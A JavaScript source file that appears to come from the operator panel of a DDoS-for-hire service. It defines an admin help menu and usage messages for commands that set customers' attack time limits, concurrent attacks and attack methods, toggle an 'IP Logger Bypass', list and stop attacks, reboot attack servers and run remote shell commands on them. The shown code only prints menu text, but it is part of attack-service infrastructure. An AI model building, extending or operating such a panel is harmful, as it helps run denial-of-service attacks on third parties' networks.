const CommandsCore = require('../../core')
const CommonData = require('../../../../common/data')
const center = require('../../../../utils/center')
const { welcome } = require('../../../../utils/logo')
const gradient = require('gradient-string')

const commands = {
    '±user [help]': 'create/delete user',
    '±adm [help]': 'change admin status',
    '±arc [help]': 'change AR status',
    '±mds [help]': 'control method params',
    '±csg [help]': 'control promt color',
    '±iplb [help]': 'IP Logger Bypass',
    'ips [user]': 'show user\'s IPs',
    'cips [user]': 'clear user\'s IPs',
    'cll [user]': 'clear user\'s lastUnix',
    'nt [user] [n]': 'set network',
    'mt [user] [t]': 'set max attack time',
    'mcs [user] [c]': ' set max concs',
    'eux [user] [unix]': ' set endUnix',
    'users': 'show all users',
    'getuser [user]': 'show user info',
    'cp [user] [pass]': 'change pass',
    'online': 'show online users',
    'reboot': 'reboot servers',
    'list all': 'show all attacks',
    'livelist all': 'all atks in realtime',
    'stop all': 'stop all attacks',
    'check': 'show servers status',
    '$ [command]': 'remote shell',
    '#$ [command]': 'shell with output'
}

const pGradient = gradient(['#FF033E', '#FF033E'])
const descGradient = gradient(['#FFFFFF', '#A9A9A9', '#FFFFFF']);

const yellow = gradient(['#ffff33', '#ffff33'])
const white = gradient(['#cccccc', '#cccccc'])

CommandsCore.cmdInit(/^ahelp$/i, async (client, command, args) => {
    if(!client.user.admin) {
        return client.write(center('У вас нет доступа к этой команде.'.red.italic, client.getWidth()) + '\n\n')
    }

    let str = '';
    let strWithoutColors = ''

    for(const cmd in commands) {
        const desc = commands[cmd]
        const symbols = '.'.repeat(Math.abs(Math.floor(client.getWidth() * 0.6 - cmd.length - desc.length - 2)))
        strWithoutColors += center('> ' + cmd + ' ' + symbols + ' ' + desc, client.getWidth()) + '\n'
    }

    for(const cmd in commands) {
        const desc = commands[cmd]
        const symbols = '.'.repeat(Math.abs(Math.floor(client.getWidth() * 0.6 - cmd.length - desc.length - 2)))
        const withoutColors = center('> ' + cmd + ' ' + symbols + ' ' + desc, client.getWidth())
        //str += strWithoutColors.split('\n')[0].split('>')[0] + '> '.red + cmd.brightWhite + ' ' + symbols.grey + ' ' + desc + ' '.repeat(Math.abs(Math.floor(((client.getWidth() - strWithoutColors.split('\n')[0].split('>')[0].length - cmd - desc - symbols - 2))))) + '\n'
        str += strWithoutColors.split('\n')[0].split('>')[0] + pGradient('>') + ' ' + cmd.brightWhite + ' ' + symbols.grey + ' ' + descGradient(desc) + '\n'
    }

    client.write(welcome(client))
    return client.write(str + '\n')
})

CommandsCore.cmdInit(/^\+user help$/i, async (client, command, args) => {
    return client.write('  ' + pGradient('> ') + yellow('Usage') + ': ' + white('+user [username] [password] [endUnix]') + '\n\n')
})
CommandsCore.cmdInit(/^\-user help$/i, async (client, command, args) => {
    return client.write('  ' + pGradient('> ') + yellow('Usage') + ': ' + white('-user [username]') + '\n\n')
})
CommandsCore.cmdInit(/^\+adm help$/i, async (client, command, args) => {
    return client.write('  ' + pGradient('> ') + yellow('Usage') + ': ' + white('+adm [username]') + '\n\n')
})
CommandsCore.cmdInit(/^\-adm help$/i, async (client, command, args) => {
    return client.write('  ' + pGradient('> ') + yellow('Usage') + ': ' + white('-adm [username]') + '\n\n')
})
CommandsCore.cmdInit(/^\+arc help$/i, async (client, command, args) => {
    return client.write('  ' + pGradient('> ') + yellow('Usage') + ': ' + white('+arc [username]') + '\n\n')
})
CommandsCore.cmdInit(/^\-arc help$/i, async (client, command, args) => {
    return client.write('  ' + pGradient('> ') + yellow('Usage') + ': ' + white('-arc [username]') + '\n\n')
})
CommandsCore.cmdInit(/^\+mds help$/i, async (client, command, args) => {
    return client.write('  ' + pGradient('> ') + yellow('Usage') + ': ' + white('+mds [username] [method] [key] [value]') + '\n\n')
})
CommandsCore.cmdInit(/^\-mds help$/i, async (client, command, args) => {
    return client.write('  ' + pGradient('> ') + yellow('Usage') + ': ' + white('-mds [username] [method] [key?]') + '\n\n')
})
CommandsCore.cmdInit(/^\+csg help$/i, async (client, command, args) => {
    return client.write('  ' + pGradient('> ') + yellow('Usage') + ': ' + white('+csg [username] [#Hex1] [#Hex2]') + '\n\n')
})
CommandsCore.cmdInit(/^\-csg help$/i, async (client, command, args) => {
    return client.write('  ' + pGradient('> ') + yellow('Usage') + ': ' + white('-csg [username]') + '\n\n')
})
CommandsCore.cmdInit(/^\+iplb help$/i, async (client, command, args) => {
    return client.write('  ' + pGradient('> ') + yellow('Usage') + ': ' + white('+iplb [username]') + '\n\n')
})
CommandsCore.cmdInit(/^\-iplb help$/i, async (client, command, args) => {
    return client.write('  ' + pGradient('> ') + yellow('Usage') + ': ' + white('-iplb [username]') + '\n\n')
})